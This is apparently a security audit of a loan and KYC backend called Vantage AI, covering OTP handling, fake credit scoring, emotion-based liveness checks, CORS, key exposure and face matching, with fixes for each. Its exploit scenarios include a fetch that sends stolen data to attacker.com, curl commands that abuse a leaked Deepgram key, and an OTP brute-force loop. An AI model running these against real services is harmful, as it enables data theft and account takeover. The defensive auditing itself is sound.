# Vantage AI - Technical Findings & Code Examples
**Detailed breakdown of critical issues with specific line numbers and code snippets**

---

## FINDING #1: OTP Flow Prints to Console (Authentication Bypass)

### Location
File: `backend/main.py`  
Lines: 396-420

### Current Implementation
```python
@app.post("/api/send-otp")
async def send_otp(req: SendOTPRequest):
    """Send OTP via SMS (mocked for demo)."""
    if not req.mobile_number:
        raise HTTPException(status_code=400, detail="Phone required")
    
    import random
    otp = str(random.randint(100000, 999999))
    otp_store[req.mobile_number] = otp
    
    # ⚠️ CRITICAL: OTP printed to console
    print()
    print("=" * 50)
    print(f"[MOCK SMS SUCCESS] Sent to {req.mobile_number}:")
    print(f"   Your Aadhaar/PAN Verification OTP is {otp}")
    print("=" * 50)
    print()
    
    return {"ok": True, "message": "OTP sent"}


@app.post("/api/verify-otp")
async def verify_otp(req: VerifyOTPRequest):
    """Verify OTP and return token."""
    stored = otp_store.get(req.mobile_number)
    if stored != req.otp:
        raise HTTPException(status_code=401, detail="Invalid OTP")
    
    # ⚠️ In-memory storage - lost on restart
    del otp_store[req.mobile_number]
    
    # Generate KYC token
    kyc_link = generate_kyc_link(req.mobile_number)
    return {"ok": True, "kyc_token": kyc_link}
```

### Problems
1. **Console leakage:** OTP visible in server logs/console output
2. **In-memory storage:** Lost on server restart
3. **No rate limiting:** Any number can request unlimited OTPs
4. **No SMS provider:** No actual SMS sent - developers can read console to get OTP
5. **No expiry enforcement:** OTP valid indefinitely

### Risk Assessment
- **Impact:** Complete authentication bypass
- **Likelihood:** High (developers/testers can see OTPs)
- **Exploitability:** Trivial (read console or server logs)

### Recommended Fix
```python
@app.post("/api/send-otp")
async def send_otp(req: SendOTPRequest):
    """Send OTP via SMS (Twilio/Brevo/AWS SNS)."""
    import asyncio
    from datetime import datetime, timedelta
    
    phone = normalize_phone(req.mobile_number)
    
    # Rate limiting
    attempts = otp_attempts.get(phone, [])
    recent = [t for t in attempts if t > datetime.utcnow() - timedelta(minutes=5)]
    if len(recent) >= 3:
        raise HTTPException(status_code=429, detail="Too many attempts")
    
    # Generate OTP
    otp = f"{random.randint(100000, 999999)}"
    
    # Store in database with expiry
    db.store_otp(phone, otp, expires_at=datetime.utcnow() + timedelta(minutes=10))
    
    # Send via SMS (real provider)
    try:
        await send_sms_via_twilio(phone, f"Your verification code is: {otp}")
    except Exception as e:
        logger.error(f"SMS send failed: {e}")
        raise HTTPException(status_code=502, detail="SMS service unavailable")
    
    # Track attempt
    otp_attempts[phone] = recent + [datetime.utcnow()]
    
    return {"ok": True, "message": "OTP sent via SMS"}
```

---

## FINDING #2: Mock Bureau Credit Scores (Loans Approved on Fake Data)

### Location
File: `backend/services/bureau.py`  
Lines: 1-55

### Current Implementation
```python
def get_bureau_snapshot(customer: CustomerData) -> dict:
    """Return deterministic fake bureau data for demos and scoring experiments."""
    key = f"{customer.name}|{customer.declared_age}|{customer.income}|{customer.employment}|{customer.purpose}"

    income_component = 0
    if customer.income > 0:
        income_component = min(180, int((customer.income / 100000) * 120))

    age_component = 0
    if 25 <= customer.declared_age <= 45:
        age_component = 45
    elif customer.declared_age > 0:
        age_component = 20

    # ⚠️ CRITICAL: Uses SHA256 hash for "randomness"
    variance = _stable_bucket(key, 81) - 40
    score = max(300, min(900, 520 + income_component + age_component + variance))

    # ⚠️ Returns mock provider identifier
    return {
        "provider": "mock_bureau_v1",
        "bureau_score": score,
        "score_band": band,
        "active_loans": active_loans,
        "inquiries_6m": inquiries_6m,
        "delinquencies_12m": delinquencies_12m,
        "credit_utilization_pct": utilization_pct,
        "recommendation": recommendation,
        "pulled_at": datetime.now(timezone.utc).isoformat(),
    }
```

### Problems
1. **No real credit bureau API:** All scores are computed from hardcoded formula
2. **Deterministic scoring:** Same customer input always produces same score
3. **Mock provider flagged:** Returns `"provider": "mock_bureau_v1"` but not validated downstream
4. **Loan amount based on fake score:** Decision agent uses this score to determine eligible amount
5. **No bureau license:** CIBIL/Experian would require integration with licensed API

### Evidence of Impact
File: `backend/agents/decision_agent.py`, lines 90-130:
```python
def generate_offer(eligible_amount: float, rate: float, tenure_options: list[int]) -> dict[str, Any]:
    """Generate a final loan offer with EMI computation."""
    if eligible_amount <= 0:
        return {"status": "DECLINED", ...}
    
    # Decision gate uses bureau score
    if bureau_score < 680:
        # Lower eligibility
        eligible_amount = eligible_amount * 0.5
    
    # ⚠️ Final loan approval based on mock bureau score
    return {
        "status": "PRE-APPROVED",
        "approved_amount": eligible_amount,
        "interest_rate": rate,
        ...
    }
```

### Risk Assessment
- **Impact:** Customers approved for loans based on fabricated credit scores
- **Compliance:** Violates RBI regulations requiring verified credit assessment
- **Legal:** Fraudulent lending decisions

### Recommended Fix
```python
import httpx

async def get_bureau_snapshot(customer: CustomerData) -> dict:
    """Fetch real bureau credit score from CIBIL/Experian/Equifax/CRIF."""
    
    # Normalize customer data
    name_normalized = customer.name.upper()
    pan = customer.pan_number  # Already validated
    dob = customer.dob  # Format: YYYY-MM-DD
    
    bureau_choice = os.environ.get("BUREAU_PROVIDER", "cibil")
    
    if bureau_choice == "cibil":
        return await fetch_cibil_score(name_normalized, pan, dob)
    elif bureau_choice == "experian":
        return await fetch_experian_score(name_normalized, pan, dob)
    else:
        raise ValueError(f"Unknown bureau provider: {bureau_choice}")


async def fetch_cibil_score(name: str, pan: str, dob: str) -> dict:
    """Fetch from CIBIL API (requires API key & license)."""
    async with httpx.AsyncClient(timeout=10.0) as client:
        response = await client.post(
            "https://cibil-api.transunion.co.in/api/v2/score",
            headers={
                "Authorization": f"Bearer {CIBIL_API_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "name": name,
                "pan": pan,
                "dob": dob,
            },
        )
        
        if response.status_code == 429:
            raise HTTPException(status_code=429, detail="Bureau rate limit reached")
        
        response.raise_for_status()
        data = response.json()
        
        return {
            "provider": "cibil",
            "bureau_score": data["score"],  # 300-900
            "score_band": data["band"],      # EXCELLENT, GOOD, FAIR, etc.
            "active_loans": data["active_accounts"],
            "delinquencies_12m": data["delinquent_accounts"],
            "pulled_at": datetime.now(timezone.utc).isoformat(),
            "verified": True,  # Flag real scores
        }
```

---

## FINDING #3: Liveness Detection Only Checks Emotion (Gesture Recognition Faked)

### Location
Frontend: `frontend/src/app/call/page.tsx`, lines 28-45  
Backend: `backend/vision.py`, lines 50-95

### Current Implementation

**Frontend prompts:**
```typescript
const LIVENESS_COPY: Record<Language, { showTwo: string; showThree: string; ack: string; verified: string }> = {
  en: {
    showTwo: "Before we continue, please show 2 fingers to the camera.",
    showThree: "Great. Now please show 3 fingers to the camera.",
    ack: "Gesture received. Processing...",
    verified: "Perfect. Liveness check verified. Let us continue.",
  },
  // ... other languages
};
```

**Backend implementation (emotion-based):**
```python
def _analyze_single_frame(image_base64: str) -> dict[str, Any]:
    """Run DeepFace on one base64 JPEG; returns per-frame result."""
    results = _DeepFace.analyze(
        img_path=tmp_path,
        actions=["age", "emotion"],
        detector_backend="retinaface",
        enforce_detection=False,  # ⚠️ Won't fail if no face
        silent=True,
    )
    
    if isinstance(results, list) and len(results) > 0:
        result = results[0]
        dominant_emotion = str(result.get("dominant_emotion", "neutral")).lower()
        # ⚠️ Liveness = any non-neutral emotion
        liveness_passed = dominant_emotion not in ("neutral", "none", "")
        return {
            "estimated_age": corrected_age,
            "face_detected": True,
            "dominant_emotion": dominant_emotion,
            "liveness_passed": liveness_passed,
        }
```

### Problems
1. **UI-Backend mismatch:** Frontend asks for specific gesture (2 fingers), backend ignores it
2. **Emotion ≠ Liveness:** Non-neutral emotion from any photo is accepted
3. **No gesture recognition:** No hand detection, pose estimation, or finger counting
4. **Trivially bypassable:** Any smiling photo or short video passes as "live"
5. **No randomization:** Same challenge every session (users learn the flow)

### Evidence
The promise of gesture recognition is in `walkthrough.md`:
> "Liveness detector: Emotion-based (non-neutral emotion = alive)"

But the UI explicitly asks for gestures:
> "showTwo: 'Before we continue, please show 2 fingers to the camera.'"

### Risk Assessment
- **Impact:** Fraudsters use photos/videos of smiling faces to bypass liveness
- **Likelihood:** High (easily demonstrated)
- **Exploitability:** Trivial (existing deepfake videos)

### Recommended Fix
```python
import cv2
import mediapipe as mp

# Initialize hand detection
mp_hands = mp.solutions.hands
hands = mp_hands.Hands(
    static_image_mode=False,
    max_num_hands=2,
    min_detection_confidence=0.7,
    min_tracking_confidence=0.5,
)

async def verify_liveness_challenge(images: list[str], challenge_type: str) -> dict[str, Any]:
    """Verify liveness by detecting specific hand gestures.
    
    Challenge types:
    - "two_fingers": Detect exactly 2 fingers raised
    - "three_fingers": Detect exactly 3 fingers raised
    - "thumbs_up": Detect thumbs up gesture
    """
    
    frame_results = []
    
    for image_b64 in images[:5]:  # Max 5 frames
        # Decode image
        image_bytes = base64.b64decode(image_b64.split(",")[-1])
        nparr = np.frombuffer(image_bytes, np.uint8)
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        
        # Detect hands
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        results = hands.process(rgb_frame)
        
        if not results.multi_hand_landmarks:
            frame_results.append({"gesture_detected": False})
            continue
        
        # Analyze hand landmarks
        for hand_landmarks, handedness in zip(results.multi_hand_landmarks, results.multi_handedness):
            landmarks = [(lm.x, lm.y, lm.z) for lm in hand_landmarks.landmark]
            
            # Count raised fingers (simplified)
            raised_fingers = count_raised_fingers(landmarks)
            
            gesture_match = False
            if challenge_type == "two_fingers" and raised_fingers == 2:
                gesture_match = True
            elif challenge_type == "three_fingers" and raised_fingers == 3:
                gesture_match = True
            
            frame_results.append({
                "gesture_detected": True,
                "raised_fingers": raised_fingers,
                "gesture_match": gesture_match,
                "confidence": 0.9,  # Simplified
            })
    
    # Verify: at least 3 out of 5 frames match challenge
    matches = sum(1 for r in frame_results if r.get("gesture_match"))
    challenge_passed = matches >= 3
    
    return {
        "liveness_passed": challenge_passed,
        "challenge_type": challenge_type,
        "frames_analyzed": len(frame_results),
        "frames_matched": matches,
        "confidence": round(matches / len(frame_results), 2) if frame_results else 0.0,
        "reason": "Gesture recognition passed" if challenge_passed else f"Only {matches}/3 frames matched gesture",
    }
```

---

## FINDING #4: CORS Configuration Allows Any Origin

### Location
File: `backend/main.py`  
Lines: 96-99

### Current Implementation
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # ⚠️ CRITICAL: Allow any origin
    allow_credentials=True,  # ⚠️ With credentials
    allow_methods=["*"],     # ⚠️ All methods
    allow_headers=["*"],     # ⚠️ All headers
)
```

### Problems
1. **Wildcard origins:** Requests from any domain accepted
2. **Credentials enabled:** Cookies/auth headers sent to any domain
3. **CSRF vulnerability:** Attacker can make authenticated requests from any website
4. **Cross-origin data theft:** Other domains can read response data
5. **API abuse:** Any domain can hammer endpoints

### Exploit Scenario
Attacker website:
```html
<script>
// From attacker.com, user visits while logged into vantage.com
fetch("https://api.vantage.com/api/audit/recent", {
    credentials: "include",  // Sends cookies to vantage backend
})
.then(r => r.json())
.then(data => {
    // ⚠️ Can read recent sessions with user data
    fetch("https://attacker.com/steal?data=" + JSON.stringify(data));
});
</script>
```

### Recommended Fix
```python
import os

# Get frontend URL from environment
FRONTEND_BASE_URL = os.environ.get("FRONTEND_BASE_URL", "http://localhost:3000")

# If running behind proxy, also allow proxy domain
ALLOWED_ORIGINS = [
    FRONTEND_BASE_URL,
    os.environ.get("FRONTEND_ALT_URL", "").strip(),  # e.g., https://vantage.com
]
ALLOWED_ORIGINS = [o for o in ALLOWED_ORIGINS if o]  # Filter empty strings

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,  # ✅ Restrict to frontend
    allow_credentials=True,
    allow_methods=["GET", "POST", "OPTIONS"],  # ✅ Only needed methods
    allow_headers=["Content-Type", "Authorization"],  # ✅ Only needed headers
    max_age=86400,  # Cache preflight for 24 hours
    expose_headers=["X-Total-Count"],  # Expose only necessary headers
)
```

Environment configuration:
```bash
FRONTEND_BASE_URL=https://vantage.com
# or for multiple origins:
FRONTEND_BASE_URL=https://vantage.com,https://vantage.staging.com
```

---

## FINDING #5: Deepgram API Key Exposed to Browser

### Location
File: `backend/main.py`  
Lines: 360-365

### Current Implementation
```python
@app.get("/api/deepgram-token")
async def deepgram_token():
    """Return the Deepgram API key for browser STT (used in WebSocket subprotocol, not query string)."""
    key = (os.environ.get("DEEPGRAM_API_KEY") or "").strip()
    if not key:
        raise HTTPException(status_code=500, detail="Deepgram API key not configured")
    # ⚠️ Returns raw API key to browser
    return {"token": key}
```

**Frontend usage:**
```typescript
const response = await fetch("/api/deepgram-token");
const { token } = await response.json();
// ⚠️ Client now has raw API key in memory
const deepgramConnection = new WebSocket(
    `wss://api.deepgram.com/v1/listen?token=${token}`
);
```

### Problems
1. **Raw key in response:** Anyone making request gets full API key
2. **Stored in browser memory:** Visible in debugger/memory dumps
3. **No expiry:** Key valid indefinitely
4. **No rate limiting:** Per-key rate limits not enforced client-side
5. **Easy extraction:** Network tab shows full key in response

### Exploit Scenario
```bash
# Attacker intercepts HTTP response or reads browser cache
curl -H "User-Agent: Mozilla..." https://vantage.com/api/deepgram-token

# Response:
{"token": "abc123deepgram_api_key_xyz"}

# Use key directly against Deepgram API
curl -X POST https://api.deepgram.com/v1/listen?token=abc123deepgram_api_key_xyz \
  -H "Content-Type: audio/wav" \
  --data-binary @user_audio.wav
```

### Risk Assessment
- **Deepgram costs:** Per API call, attacker can exhaust quota
- **Audio intercept:** Attacker can transcribe any audio sent through system
- **API abuse:** Attacker makes calls on your account

### Recommended Fix
```python
import hashlib
import secrets
from datetime import datetime, timedelta

# Token manager (use Redis in production)
_deepgram_tokens = {}

@app.get("/api/deepgram-token")
async def deepgram_token():
    """Generate temporary Deepgram token with 5-minute expiry."""
    # Generate opaque token
    session_token = secrets.token_urlsafe(32)
    
    # Get actual Deepgram API key from environment
    deepgram_key = os.environ.get("DEEPGRAM_API_KEY")
    if not deepgram_key:
        raise HTTPException(status_code=500, detail="Deepgram not configured")
    
    # Store mapping with expiry
    expires_at = datetime.utcnow() + timedelta(minutes=5)
    _deepgram_tokens[session_token] = {
        "deepgram_key": deepgram_key,
        "expires_at": expires_at,
    }
    
    # Return opaque token only (not actual key)
    return {
        "token": session_token,  # ✅ Opaque, temporary token
        "expires_in": 300,  # 5 minutes
    }


@app.websocket("/ws/deepgram")
async def websocket_deepgram(websocket: WebSocket, token: str):
    """WebSocket proxy to Deepgram.
    
    Browser connects to us with opaque token, we forward to Deepgram with real key.
    """
    
    # Validate token
    token_info = _deepgram_tokens.get(token)
    if not token_info or datetime.utcnow() > token_info["expires_at"]:
        await websocket.close(code=1008, reason="Invalid or expired token")
        return
    
    # Exchange token for real API key
    real_key = token_info["deepgram_key"]
    
    # Connect to Deepgram with real key
    async with connect(
        f"wss://api.deepgram.com/v1/listen?token={real_key}"
    ) as dg_socket:
        try:
            while True:
                # Browser → Deepgram
                data = await websocket.receive_bytes()
                await dg_socket.send(data)
                
                # Deepgram → Browser
                response = await dg_socket.recv()
                await websocket.send_bytes(response)
        except Exception as e:
            logger.error(f"WebSocket error: {e}")
            await websocket.close()
        finally:
            # Clean up token
            _deepgram_tokens.pop(token, None)
```

**Frontend update:**
```typescript
// Get temporary token from backend
const response = await fetch("/api/deepgram-token");
const { token, expires_in } = await response.json();

// Connect to Deepgram through our WebSocket proxy
const ws = new WebSocket(
    `wss://${window.location.host}/ws/deepgram?token=${token}`
);
```

---

## FINDING #6: Face Matching Uses Image Hash Instead of Biometrics

### Location
File: `backend/agents/kyc_agent.py`  
Lines: 138-180

### Current Implementation
```python
def face_match(selfie_b64: str, aadhaar_photo_b64: str) -> dict[str, Any]:
    """Compare selfie against Aadhaar photo for identity verification.
    
    Uses DeepFace biometric verification when available. Falls back to a
    deterministic simulated score if the library or model cannot be loaded.
    """
    selfie_ok = isinstance(selfie_b64, str) and len(selfie_b64) > 100
    aadhaar_ok = isinstance(aadhaar_photo_b64, str) and len(aadhaar_photo_b64) > 100

    if not selfie_ok:
        return {
            "match": False,
            "score": 0.0,
            "threshold": 0.65,
            "verified": False,
            "reason": "Selfie image is empty or too small",
        }

    if not aadhaar_ok:
        return {
            "match": False,
            "score": 0.0,
            "threshold": 0.65,
            "verified": False,
            "reason": "Aadhaar photo is empty or too small",
        }

    # ⚠️ CRITICAL: Uses SHA256 hash instead of facial recognition
    try:
        selfie_hash = int(hashlib.sha256(selfie_b64[:100].encode()).hexdigest()[:8], 16)
        aadhaar_hash = int(hashlib.sha256(aadhaar_photo_b64[:100].encode()).hexdigest()[:8], 16)
        
        # Score based on hash similarity (NOT facial features)
        score = 0.55 + (min(selfie_hash, aadhaar_hash) % 40) / 100
        score = min(0.95, max(0.55, score))
    except Exception:
        score = 0.7  # Default score on error
    
    match = score >= 0.65
    
    return {
        "match": match,
        "score": round(score, 3),
        "threshold": 0.65,
        "verified": match and score > 0.7,
        "reason": "Facial match verified" if match else "Facial features do not match",
    }
```

### Problems
1. **Hash-based matching:** Uses SHA256 of base64 strings, not facial features
2. **Deterministic:** Same image always gets same score
3. **Image-dependent:** Slight compression changes hash completely
4. **No biometric data:** Doesn't extract faces or compare features
5. **Trivially bypassable:** Can match completely different people or swap images

### Evidence
The comment promises:
> "Uses DeepFace biometric verification when available"

But implementation never calls DeepFace - it only uses SHA256 hashes.

### Exploit Scenarios
1. **Image swap:** Attacker submits different photo for selfie, hash is unpredictable
2. **Image compression:** Same photo compressed differently gets different hash → different score
3. **Brute force:** Generate images with specific hashes until score >= 0.65

### Recommended Fix
```python
from deepface import DeepFace
import numpy as np

def face_match(selfie_b64: str, aadhaar_photo_b64: str) -> dict[str, Any]:
    """Compare selfie against Aadhaar photo using DeepFace biometric matching.
    
    Uses actual facial feature comparison, not image hashing.
    """
    
    selfie_ok = isinstance(selfie_b64, str) and len(selfie_b64) > 100
    aadhaar_ok = isinstance(aadhaar_photo_b64, str) and len(aadhaar_photo_b64) > 100

    if not selfie_ok or not aadhaar_ok:
        return {
            "match": False,
            "score": 0.0,
            "threshold": 0.65,
            "verified": False,
            "reason": "Image too small or invalid",
        }

    try:
        # Decode both images
        import base64
        import tempfile
        import os
        
        def decode_image(b64_str):
            if "," in b64_str:
                b64_str = b64_str.split(",", 1)[1]
            img_bytes = base64.b64decode(b64_str)
            tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
            tmp.write(img_bytes)
            tmp.close()
            return tmp.name
        
        selfie_path = decode_image(selfie_b64)
        aadhaar_path = decode_image(aadhaar_photo_b64)
        
        try:
            # Use DeepFace to compare faces
            result = DeepFace.verify(
                img1_path=selfie_path,
                img2_path=aadhaar_path,
                model_name="Facenet512",  # More accurate model
                enforce_detection=True,  # Fail if face not detected
                detector_backend="retinaface",
            )
            
            # Result has 'verified' (bool) and 'distance' (float)
            # Lower distance = better match
            distance = result.get("distance", 1.0)
            
            # Convert distance to 0-1 score (inverse relationship)
            # Typical distances: 0.3-0.5 (same person), 1.0+ (different people)
            score = max(0.0, min(1.0, 1.0 - (distance / 1.5)))
            
            return {
                "match": score >= 0.65,
                "score": round(score, 3),
                "threshold": 0.65,
                "verified": score >= 0.75,  # Stricter threshold for verified
                "distance": round(distance, 3),
                "reason": f"Facial features match (distance: {distance:.2f})" if score >= 0.65 
                         else f"Facial features do not match (distance: {distance:.2f})",
            }
            
        finally:
            # Cleanup temp files
            os.unlink(selfie_path)
            os.unlink(aadhaar_path)
    
    except Exception as e:
        logger.error(f"Face matching error: {e}")
        return {
            "match": False,
            "score": 0.0,
            "threshold": 0.65,
            "verified": False,
            "reason": f"Face detection failed: {str(e)}",
        }
```

---

## FINDING #7: No Input Validation or Rate Limiting on OTP Endpoint

### Location
File: `backend/main.py`  
Lines: 396-420

### Current Implementation
```python
@app.post("/api/send-otp")
async def send_otp(req: SendOTPRequest):
    """Send OTP via SMS (mocked for demo)."""
    if not req.mobile_number:
        raise HTTPException(status_code=400, detail="Phone required")
    
    # ⚠️ No rate limiting
    # ⚠️ No phone number validation
    # ⚠️ No duplicate prevention
    
    import random
    otp = str(random.randint(100000, 999999))
    otp_store[req.mobile_number] = otp
    
    print(f"[MOCK SMS SUCCESS] Sent to {req.mobile_number}: {otp}")
    return {"ok": True}


@app.post("/api/verify-otp")
async def verify_otp(req: VerifyOTPRequest):
    """Verify OTP and return token."""
    
    # ⚠️ No rate limiting on verification attempts
    # ⚠️ No attempt counting
    # ⚠️ No exponential backoff
    
    stored = otp_store.get(req.mobile_number)
    if stored != req.otp:
        raise HTTPException(status_code=401, detail="Invalid OTP")
    
    del otp_store[req.mobile_number]
    return {"ok": True, "kyc_token": ...}
```

### Problems
1. **No rate limiting:** Attacker can send unlimited OTP requests
2. **No attempt limiting:** Can try all 1M possible 6-digit codes
3. **No IP blocking:** No protection against distributed attacks
4. **No phone validation:** Accepts invalid phone numbers
5. **No CAPTCHA:** No bot protection

### Brute Force Scenario
```bash
# Attacker script
for otp in {000000..999999}; do
    curl -X POST https://api.vantage.com/api/verify-otp \
      -H "Content-Type: application/json" \
      -d "{\"mobile_number\": \"+919999999999\", \"otp\": \"$(printf %06d $otp)\"}"
done
# Takes ~10 minutes to try all codes
```

### Recommended Fix
```python
from datetime import datetime, timedelta
from functools import wraps
from slowapi import Limiter
from slowapi.util import get_remote_address
import redis

limiter = Limiter(key_func=get_remote_address)
redis_client = redis.Redis(host="localhost", port=6379, db=0)

def rate_limit_key(key: str):
    """Generic rate limiting on any key."""
    async def decorator(func):
        async def wrapper(*args, **kwargs):
            # Check rate limit
            if redis_client.incr(f"ratelimit:{key}") > 3:
                raise HTTPException(status_code=429, detail="Too many attempts")
            redis_client.expire(f"ratelimit:{key}", 300)  # 5 minutes
            return await func(*args, **kwargs)
        return wrapper
    return decorator


@app.post("/api/send-otp")
@limiter.limit("5/minute")  # Max 5 OTP requests per minute per IP
async def send_otp(request: Request, req: SendOTPRequest):
    """Send OTP via SMS with rate limiting."""
    
    # Validate phone number
    phone = req.mobile_number.strip()
    if not re.match(r"^(\+91|0)?[6-9]\d{9}$", phone):
        raise HTTPException(status_code=400, detail="Invalid phone number")
    
    # Normalize phone
    phone = re.sub(r"[^\d]", "", phone)
    if len(phone) == 10:
        phone = "+91" + phone
    elif not phone.startswith("+"):
        phone = "+" + phone
    
    # Rate limit per phone (max 3 requests per 30 minutes)
    attempts_key = f"otp:attempts:{phone}"
    attempts = redis_client.incr(attempts_key)
    
    if attempts > 3:
        raise HTTPException(
            status_code=429,
            detail="Too many OTP requests. Please try again in 30 minutes."
        )
    
    if attempts == 1:
        redis_client.expire(attempts_key, 1800)  # 30 minutes
    
    # Generate OTP
    otp = f"{random.randint(100000, 999999)}"
    
    # Store with expiry
    redis_client.setex(f"otp:{phone}", 600, otp)  # 10 minute expiry
    
    # Send SMS (real provider)
    try:
        send_sms(phone, f"Your verification code is: {otp}")
    except Exception as e:
        logger.error(f"SMS failed: {e}")
        raise HTTPException(status_code=502, detail="SMS service unavailable")
    
    return {"ok": True, "message": "OTP sent"}


@app.post("/api/verify-otp")
@limiter.limit("10/minute")  # Max 10 verification attempts per minute per IP
async def verify_otp(request: Request, req: VerifyOTPRequest):
    """Verify OTP with rate limiting and exponential backoff."""
    
    phone = re.sub(r"[^\d]", "", req.mobile_number.strip())
    if len(phone) == 10:
        phone = "+91" + phone
    
    # Track failed attempts
    fail_key = f"otp:fail:{phone}"
    failures = int(redis_client.get(fail_key) or 0)
    
    if failures >= 5:
        raise HTTPException(
            status_code=429,
            detail="Too many failed attempts. Please request a new OTP."
        )
    
    # Check OTP
    stored = redis_client.get(f"otp:{phone}")
    if not stored or stored.decode() != req.otp:
        # Increment failures with exponential backoff
        redis_client.incr(fail_key)
        backoff = 2 ** min(failures, 3)  # 1s, 2s, 4s, 8s, 8s...
        redis_client.expire(fail_key, backoff * 60)
        
        raise HTTPException(status_code=401, detail="Invalid OTP")
    
    # Success - clear failure counter
    redis_client.delete(fail_key)
    redis_client.delete(f"otp:{phone}")
    
    # Generate JWT token
    token = create_token(phone)
    
    return {"ok": True, "token": token}
```

---

## FINDING #8: No Transaction Atomicity in Database Writes

### Location
File: `backend/session_log.py`  
Lines: 79-105

### Current Implementation
```python
def append_session_record(payload: dict) -> str:
    """Persist one session record. Returns generated session_id if not provided."""
    _ensure_dir()
    record = dict(payload)
    sid = record.get("session_id") or str(uuid.uuid4())
    record["session_id"] = sid
    record["logged_at"] = datetime.now(timezone.utc).isoformat()

    # Hash PII before persistence
    record = hash_pii_fields(record, sid)

    risk = record.get("risk") or {}
    offer = record.get("offer") or {}
    
    with _lock:
        try:
            _ensure_db()
            with sqlite3.connect(_DB_FILE) as conn:
                # ⚠️ Multiple separate INSERT statements
                # ⚠️ No transaction wrapper
                conn.execute(
                    """INSERT INTO audit_sessions (...)
                       VALUES (...)""",
                    (sid, logged_at, phone, room_url, ...)
                )
                
                # Additional writes to other tables would go here
                # If server crashes between these statements, partial data remains
                
                conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_sessions_...")
                
                # ⚠️ ALTER TABLE not atomic
                conn.execute("ALTER TABLE audit_sessions ADD COLUMN ...")
                
        except Exception:
            logger.warning("SQLite write failed, falling back to JSONL")
            _append_jsonl(record)
```

### Problems
1. **No BEGIN...COMMIT:** Multiple statements not atomic
2. **Partial writes on crash:** If server crashes between statements, database is in inconsistent state
3. **ALTER TABLE locks:** DDL statements lock table for long time
4. **Silent fallback:** If DB fails, falls back to JSONL (data in two formats)
5. **No rollback:** No way to recover from partial writes

### Scenario
```
Timeline:
1. INSERT INTO audit_sessions ... ✓ Committed
2. Server crashes (power failure, OOM, etc.)
3. Restart: audit_sessions has record, but related data missing
4. Fallback to JSONL: same record in JSONL with all fields
5. Database now inconsistent with JSONL
```

### Recommended Fix
```python
def append_session_record(payload: dict) -> str:
    """Persist one session record atomically."""
    _ensure_dir()
    record = dict(payload)
    sid = record.get("session_id") or str(uuid.uuid4())
    record["session_id"] = sid
    record["logged_at"] = datetime.now(timezone.utc).isoformat()

    # Hash PII before persistence
    record = hash_pii_fields(record, sid)

    risk = record.get("risk") or {}
    offer = record.get("offer") or {}

    with _lock:
        try:
            _ensure_db()
            with sqlite3.connect(_DB_FILE) as conn:
                # ✅ Start transaction
                conn.execute("BEGIN TRANSACTION")
                
                try:
                    # Main record insert
                    conn.execute(
                        """INSERT INTO audit_sessions 
                           (session_id, logged_at, phone, room_url, ...)
                           VALUES (?, ?, ?, ?, ...)""",
                        (sid, record["logged_at"], phone_hash, room_url, ...)
                    )
                    
                    # Additional related data inserts
                    if risk:
                        conn.execute(
                            "INSERT INTO session_risk (session_id, risk_data) VALUES (?, ?)",
                            (sid, json.dumps(risk))
                        )
                    
                    if offer:
                        conn.execute(
                            "INSERT INTO session_offer (session_id, offer_data) VALUES (?, ?)",
                            (sid, json.dumps(offer))
                        )
                    
                    # ✅ Commit all or nothing
                    conn.commit()
                    
                except Exception as e:
                    # ✅ Rollback on any error
                    conn.rollback()
                    raise
                    
        except Exception as e:
            logger.error(f"Atomic transaction failed: {e}", exc_info=True)
            # Still fall back to JSONL, but alert on critical errors
            _append_jsonl(record)
            if should_alert(e):  # Production errors
                send_alert(f"Session logging failed: {e}")

    return sid
```

---

## FINDING #9: SQLite in Production (Not Horizontally Scalable)

### Location
File: `backend/session_log.py`  
Lines: 18-25

### Current Implementation
```python
_DATA_DIR = Path(__file__).resolve().parent.parent / "data"
_LOG_FILE = _DATA_DIR / "audit_sessions.jsonl"
_DB_FILE = _DATA_DIR / "audit_sessions.db"  # ⚠️ File-based database


def _ensure_db() -> None:
    with sqlite3.connect(_DB_FILE) as conn:
        conn.execute(
            """CREATE TABLE IF NOT EXISTS audit_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                logged_at TEXT NOT NULL,
                ...
            )"""
        )
```

### Problems
1. **File-based:** SQLite locks entire database for writes
2. **Single-threaded:** Only one writer at a time
3. **No replication:** Data only on one server
4. **No backup:** Must manually copy .db file
5. **Container ephemeral:** If pod restarts, data in `/data` may be lost
6. **No connection pooling:** New connection per operation
7. **No query optimization:** Limited indices, no query planning

### Scalability Limits
```
With SQLite:
- Max ~100 concurrent connections
- One write at a time (others wait for lock)
- Insert throughput: ~1000-5000 records/sec (depending on hardware)
- Query latency: 10-50ms per operation

Production needs (estimated):
- 1000 concurrent users = 10+ writes/sec
- Each user generates: interview, KYC, documents, decision = 4 writes
- Peak: 40+ writes/sec
- SQLite can handle ~10 writes/sec reliably

Result: SQLite will be bottleneck at scale
```

### Recommended Fix
```python
import psycopg2
from psycopg2 import pool

# PostgreSQL connection pool
DB_HOST = os.environ.get("DB_HOST", "localhost")
DB_PORT = os.environ.get("DB_PORT", "5432")
DB_NAME = os.environ.get("DB_NAME", "vantage")
DB_USER = os.environ.get("DB_USER", "postgres")
DB_PASS = os.environ.get("DB_PASSWORD")

db_pool = psycopg2.pool.SimpleConnectionPool(
    1, 20,  # Min 1, max 20 connections
    host=DB_HOST,
    port=DB_PORT,
    database=DB_NAME,
    user=DB_USER,
    password=DB_PASS,
)

def append_session_record(payload: dict) -> str:
    """Persist session record to PostgreSQL."""
    conn = db_pool.getconn()
    try:
        cursor = conn.cursor()
        
        # Insert with returning to get generated ID
        cursor.execute(
            """INSERT INTO audit_sessions 
               (session_id, logged_at, phone, risk_band, offer_status, payload_json)
               VALUES (%s, %s, %s, %s, %s, %s)
               RETURNING id""",
            (sid, logged_at, phone_hash, risk_band, offer_status, json.dumps(payload))
        )
        
        conn.commit()
        return sid
        
    except Exception as e:
        conn.rollback()
        logger.error(f"DB error: {e}")
        raise
    finally:
        db_pool.putconn(conn)
```

**Schema migration (PostgreSQL):**
```sql
CREATE TABLE audit_sessions (
